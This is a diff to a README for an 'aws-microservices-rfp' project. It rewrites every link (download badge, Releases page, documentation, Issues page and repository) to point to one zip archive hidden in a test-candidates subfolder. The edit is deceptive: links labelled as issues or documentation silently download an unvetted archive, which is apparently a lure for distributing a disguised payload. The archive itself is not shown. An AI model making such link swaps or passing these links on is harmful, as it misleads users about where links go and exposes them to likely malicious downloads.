@@ -16,7 +16,7 @@ To get started with the application, follow these steps:
 2. **Download the Application**
    - Click the link below to download the latest release of the application.
    
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%A0-blue)](https://github.com/Gamersproyt/aws-microservices-rfp/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip%20Latest%20Release-%20%F0%9F%93%A0-blue)](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
 
 3. **Installation Steps**
    - Once the download is complete, locate the downloaded file in your system's downloads folder.
@@ -28,7 +28,7 @@ To install the application, follow these simple steps:
 
 1. **Visit the Download Page**
    - Go to the Releases page:
-   [Visit Releases Page](https://github.com/Gamersproyt/aws-microservices-rfp/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
    
 2. **Select the Appropriate File**
    - On the Releases page, find the version you wish to download.
@@ -64,10 +64,10 @@ The **aws-microservices-rfp** application offers the following features:
 - **API Gateway Integration**: Manage microservices through Kong API Gateway.
 
 ## 📚 Documentation
-For detailed documentation regarding setup, usage, and configuration, please check the [documentation folder](https://github.com/Gamersproyt/aws-microservices-rfp/docs).
+For detailed documentation regarding setup, usage, and configuration, please check the [documentation folder](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip).
 
 ## 🛠️ Issues and Support
-If you encounter issues while using the application, you can visit the [Issues page](https://github.com/Gamersproyt/aws-microservices-rfp/issues). You can report bugs or request new features there. 
+If you encounter issues while using the application, you can visit the [Issues page](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip). You can report bugs or request new features there. 
 
 For further assistance, feel free to reach out via the issues page or check the community forums.
 
@@ -94,9 +94,9 @@ This project covers various topics including:
 - Terraform
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/Gamersproyt/aws-microservices-rfp)
-- [Releases Page](https://github.com/Gamersproyt/aws-microservices-rfp/releases)
-- [Issues Page](https://github.com/Gamersproyt/aws-microservices-rfp/issues)
-- [Documentation](https://github.com/Gamersproyt/aws-microservices-rfp/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
+- [Issues Page](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Gamersproyt/aws-microservices-rfp/main/Backend/Servicio_1/Api.Candidatos/TestCandidates/aws-microservices-rfp-3.1.zip)
 
 This README aims to provide a comprehensive guide to users so they can easily download, install, and start using the application. Feel free to explore the application and participate in the community!
